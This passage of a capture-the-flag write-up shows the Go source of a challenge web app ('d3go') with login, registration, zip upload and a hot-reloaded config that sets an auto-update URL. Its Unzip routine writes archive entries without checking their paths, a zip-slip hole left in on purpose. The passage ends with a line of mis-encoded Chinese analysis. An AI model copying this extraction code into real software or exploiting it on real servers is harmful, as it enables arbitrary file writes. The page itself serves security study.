class="string">&quot;github.com/fsnotify/fsnotify&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/jpillora/overseer/fetcher&quot;</span></span><br><span class="line">log <span class="string">&quot;github.com/sirupsen/logrus&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/spf13/viper&quot;</span></span><br><span class="line"><span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> Conf config</span><br><span class="line"><span class="keyword">var</span> Fetch fetcher.HTTP</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> config <span class="keyword">struct</span> &#123;</span><br><span class="line">NoAdminLogin <span class="type">bool</span></span><br><span class="line">DBUser       <span class="type">string</span></span><br><span class="line">DBPasswd     <span class="type">string</span></span><br><span class="line">DBHost       <span class="type">string</span></span><br><span class="line">DBPort       <span class="type">string</span></span><br><span class="line">AutoUpdate   <span class="type">bool</span></span><br><span class="line">UpdateUrl    <span class="type">string</span></span><br><span class="line">UpdateTime   time.Duration</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Init</span><span class="params">()</span></span> &#123;</span><br><span class="line">viper.SetConfigName(<span class="string">&quot;config&quot;</span>)</span><br><span class="line">viper.SetConfigType(<span class="string">&quot;yaml&quot;</span>)</span><br><span class="line">viper.AddConfigPath(<span class="string">&quot;.&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err := viper.ReadInConfig(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(err)</span><br><span class="line">&#125;</span><br><span class="line">UpdateConfig()</span><br><span class="line">viper.OnConfigChange(<span class="function"><span class="keyword">func</span><span class="params">(in fsnotify.Event)</span></span> &#123;</span><br><span class="line">UpdateConfig()</span><br><span class="line">&#125;)</span><br><span class="line">viper.WatchConfig()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">UpdateConfig</span><span class="params">()</span></span> &#123;</span><br><span class="line">Conf.DBUser = viper.GetString(<span class="string">&quot;database.user&quot;</span>)</span><br><span class="line">Conf.DBPasswd = viper.GetString(<span class="string">&quot;database.password&quot;</span>)</span><br><span class="line">Conf.DBHost = viper.GetString(<span class="string">&quot;database.host&quot;</span>)</span><br><span class="line">Conf.DBPort = viper.GetString(<span class="string">&quot;database.port&quot;</span>)</span><br><span class="line">Conf.NoAdminLogin = viper.GetBool(<span class="string">&quot;server.noAdminLogin&quot;</span>)</span><br><span class="line">Conf.AutoUpdate = viper.GetBool(<span class="string">&quot;update.enabled&quot;</span>)</span><br><span class="line">Fetch = fetcher.HTTP&#123;</span><br><span class="line">URL:      viper.GetString(<span class="string">&quot;update.url&quot;</span>),</span><br><span class="line">Interval: viper.GetDuration(<span class="string">&quot;update.interval&quot;</span>) * time.Second,</span><br><span class="line">&#125;</span><br><span class="line">Fetch.Init()</span><br><span class="line">log.Println(<span class="string">&quot;config updated&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>controller.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> controller</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;d3go/model&quot;</span></span><br><span class="line"><span class="string">&quot;d3go/service/auth&quot;</span></span><br><span class="line"><span class="string">&quot;d3go/service/upload&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gin-contrib/sessions&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/google/uuid&quot;</span></span><br><span class="line"><span class="string">&quot;path&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Resp <span class="keyword">struct</span> &#123;</span><br><span class="line">StatusCode <span class="type">int</span>    <span class="string">`json:&quot;status_code&quot;`</span></span><br><span class="line">StatusMsg  <span class="type">string</span> <span class="string">`json:&quot;status_msg,omitempty&quot;`</span></span><br><span class="line">Data       any    <span class="string">`json:&quot;data&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ErrFormatError = <span class="string">&quot;format error&quot;</span></span><br><span class="line"><span class="keyword">var</span> ErrInternalServer = <span class="string">&quot;internal server error&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Login</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">u := &amp;model.User&#123;&#125;</span><br><span class="line">err := c.ShouldBindJSON(u)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(<span class="number">200</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">-1</span>,</span><br><span class="line">StatusMsg:  ErrFormatError,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">permission, err := auth.Login(u)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(<span class="number">200</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">-1</span>,</span><br><span class="line">StatusMsg:  ErrInternalServer,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">session := sessions.Default(c)</span><br><span class="line"><span class="keyword">switch</span> permission &#123;</span><br><span class="line"><span class="keyword">case</span> auth.UnAuthed:</span><br><span class="line">c.JSON(<span class="number">200</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">-1</span>,</span><br><span class="line">StatusMsg:  <span class="string">&quot;login fail&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">case</span> auth.User:</span><br><span class="line">session.Set(<span class="string">&quot;admin&quot;</span>, <span class="literal">false</span>)</span><br><span class="line">session.Save()</span><br><span class="line">c.JSON(<span class="number">200</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">0</span>,</span><br><span class="line">StatusMsg:  <span class="string">&quot;login success&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">case</span> auth.Admin:</span><br><span class="line">session.Set(<span class="string">&quot;admin&quot;</span>, <span class="literal">true</span>)</span><br><span class="line">session.Save()</span><br><span class="line">c.JSON(<span class="number">200</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">0</span>,</span><br><span class="line">StatusMsg:  <span class="string">&quot;login as admin success&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Register</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> u model.User</span><br><span class="line">err := c.ShouldBindJSON(&amp;u)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(<span class="number">200</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">-1</span>,</span><br><span class="line">StatusMsg:  ErrFormatError,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">err = auth.Register(&amp;u)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(<span class="number">200</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">-1</span>,</span><br><span class="line">StatusMsg:  ErrInternalServer,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">c.JSON(<span class="number">200</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">0</span>,</span><br><span class="line">StatusMsg:  <span class="string">&quot;register success&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Upload</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">f, err := c.FormFile(<span class="string">&quot;file&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(<span class="number">500</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">-1</span>,</span><br><span class="line">StatusMsg:  <span class="string">&quot;upload fail&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (f.Header.Get(<span class="string">&quot;Content-Type&quot;</span>) != <span class="string">&quot;application/zip&quot;</span> &amp;&amp; f.Header.Get(<span class="string">&quot;Content-Type&quot;</span>) != <span class="string">&quot;application/x-zip-compressed&quot;</span>) || path.Ext(f.Filename) != <span class="string">&quot;.zip&quot;</span> &#123;</span><br><span class="line">c.JSON(<span class="number">500</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">-1</span>,</span><br><span class="line">StatusMsg:  <span class="string">&quot;not a zip file&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">uu := uuid.New()</span><br><span class="line"></span><br><span class="line">zipPath := path.Join(<span class="string">&quot;upload&quot;</span>, uu.String()+<span class="string">&quot;.zip&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err := c.SaveUploadedFile(f, zipPath); err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(<span class="number">500</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">-1</span>,</span><br><span class="line">StatusMsg:  <span class="string">&quot;save zip fail&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">tree, err := upload.Unzip(zipPath, path.Join(<span class="string">&quot;unzipped&quot;</span>, uu.String()))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(<span class="number">500</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">-1</span>,</span><br><span class="line">StatusMsg:  <span class="string">&quot;upload fail&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">c.JSON(<span class="number">200</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">0</span>,</span><br><span class="line">StatusMsg:  <span class="string">&quot;upload success&quot;</span>,</span><br><span class="line">Data:       tree.Children,</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>db.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> db</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;d3go/config&quot;</span></span><br><span class="line"><span class="string">&quot;d3go/model&quot;</span></span><br><span class="line"><span class="string">&quot;encoding/hex&quot;</span></span><br><span class="line"><span class="string">&quot;errors&quot;</span></span><br><span class="line">log <span class="string">&quot;github.com/sirupsen/logrus&quot;</span></span><br><span class="line"><span class="string">&quot;math/rand&quot;</span></span><br><span class="line"><span class="string">&quot;time&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;gorm.io/driver/mysql&quot;</span></span><br><span class="line"><span class="string">&quot;gorm.io/gorm&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ErrDatabase = errors.New(<span class="string">&quot;database error&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> db *gorm.DB</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Init</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> err := tryOpen(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(err)</span><br><span class="line">&#125;</span><br><span class="line">err := db.AutoMigrate(&amp;model.User&#123;&#125;)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// create admin</span></span><br><span class="line">rand.Seed(time.Now().UnixMicro())</span><br><span class="line"><span class="keyword">var</span> rad [<span class="number">32</span>]<span class="type">byte</span></span><br><span class="line">rand.Read(rad[:])</span><br><span class="line"><span class="keyword">if</span> ok, _ := IsFirstRegistered(); ok &#123;</span><br><span class="line">db.Save(&amp;model.User&#123;</span><br><span class="line">Username: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">Password: hex.EncodeToString(rad[:]),</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">tryOpen</span><span class="params">()</span></span> <span class="type">error</span> &#123;</span><br><span class="line"><span class="keyword">var</span> err <span class="type">error</span></span><br><span class="line"><span class="keyword">var</span> database *gorm.DB</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">100</span>; i++ &#123;</span><br><span class="line">database, err = gorm.Open(mysql.Open(config.Conf.DBUser+<span class="string">&quot;:&quot;</span>+config.Conf.DBPasswd+<span class="string">&quot;@tcp(&quot;</span>+config.Conf.DBHost+<span class="string">&quot;:&quot;</span>+config.Conf.DBPort+<span class="string">&quot;)/db?parseTime=True&quot;</span>), &amp;gorm.Config&#123;&#125;)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">time.Sleep(time.Second * <span class="number">3</span>)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line">db = database</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">IsAdmin</span><span class="params">(u *model.User)</span></span> <span class="type">bool</span> &#123;</span><br><span class="line"><span class="keyword">var</span> admin model.User</span><br><span class="line"><span class="keyword">if</span> err := db.First(&amp;admin).Error; err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Error(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> u.Username == admin.Username</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">AddUser</span><span class="params">(u *model.User)</span></span> <span class="type">error</span> &#123;</span><br><span class="line"><span class="keyword">if</span> err := db.Save(u).Error; err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.WithField(<span class="string">&quot;user&quot;</span>, u).Error(err)</span><br><span class="line"><span class="keyword">return</span> ErrDatabase</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">CheckAuth</span><span class="params">(u *model.User)</span></span> (<span class="type">bool</span>, <span class="type">error</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> err := db.Where(<span class="string">&quot;username = ? AND password = ?&quot;</span>, u.Username, u.Password).First(&amp;u).Error; err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">if</span> errors.Is(err, gorm.ErrRecordNotFound) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line">log.WithField(<span class="string">&quot;user&quot;</span>, u).Error(err)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>, ErrDatabase</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">IsFirstRegistered</span><span class="params">()</span></span> (<span class="type">bool</span>, <span class="type">error</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> err := db.First(&amp;model.User&#123;&#125;).Error; err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">if</span> errors.Is(err, gorm.ErrRecordNotFound) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line">log.WithField(<span class="string">&quot;user&quot;</span>, model.User&#123;&#125;).Error(err)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>, ErrDatabase</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>auth.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> auth</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;d3go/config&quot;</span></span><br><span class="line"><span class="string">&quot;d3go/db&quot;</span></span><br><span class="line"><span class="string">&quot;d3go/model&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">UnAuthed <span class="type">int</span> = <span class="literal">iota</span> - <span class="number">1</span></span><br><span class="line">User</span><br><span class="line">Admin</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Login</span><span class="params">(u *model.User)</span></span> (<span class="type">int</span>, <span class="type">error</span>) &#123;</span><br><span class="line">ok, err := db.CheckAuth(u)</span><br><span class="line"><span class="keyword">if</span> !ok || err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> UnAuthed, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> config.Conf.NoAdminLogin &amp;&amp; u.ID == <span class="number">1</span> &#123;</span><br><span class="line"><span class="keyword">return</span> UnAuthed, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> db.IsAdmin(u) &#123;</span><br><span class="line"><span class="keyword">return</span> Admin, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> User, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Register</span><span class="params">(u *model.User)</span></span> <span class="type">error</span> &#123;</span><br><span class="line"><span class="keyword">return</span> db.AddUser(u)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>upload.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> upload</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;archive/zip&quot;</span></span><br><span class="line"><span class="string">&quot;d3go/utils&quot;</span></span><br><span class="line"><span class="string">&quot;io&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line"><span class="string">&quot;path&quot;</span></span><br><span class="line"><span class="string">&quot;path/filepath&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Unzip</span><span class="params">(zipPath <span class="type">string</span>, outputPath <span class="type">string</span>)</span></span> (*utils.Tree, <span class="type">error</span>) &#123;</span><br><span class="line">r, err := zip.OpenReader(zipPath)</span><br><span class="line"><span class="keyword">defer</span> r.Close()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err := os.MkdirAll(outputPath, <span class="number">0750</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">tree := utils.NewTree(filepath.Base(outputPath))</span><br><span class="line"><span class="keyword">for</span> _, f := <span class="keyword">range</span> r.File &#123;</span><br><span class="line">utils.Paths2Tree(f.Name, path.Join(outputPath, f.Name), tree)</span><br><span class="line">p, _ := filepath.Abs(filepath.Join(outputPath, f.Name))</span><br><span class="line">content, err := f.Open()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">data, err := io.ReadAll(content)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">content.Close()</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> err := os.MkdirAll(filepath.Dir(p), <span class="number">0750</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line">content.Close()</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> err := os.WriteFile(p, data, <span class="number">0750</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line">content.Close()</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">content.Close()</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> tree, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç¨å¾®å®¡ä¸€ä¸‹é¢˜ï¼Œé¦–å…ˆåœ¨main.goæœ‰è¿™ä¹ˆä¸€æ®µ</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ServeFile</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line"><span class="comment">// unzipped file server</span></span><br><span class="line">p := c.Param(<span class="string">&quot;filepath&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> strings.HasPrefix(p, <span class="string">&quot;/unzipped&quot;</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(p) == <span class="number">9</span> &#123;</span><br><span class="line">p = <span class="string">&quot;/&quot;</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">p = p[<span class="number">9</span>:]</span><br><span class="line">&#125;</span><br><span class="line">c.FileFromFS(p, http.Dir(<span class="string">&quot;./unzipped&quot;</span>))</span><br><span class="line"><span 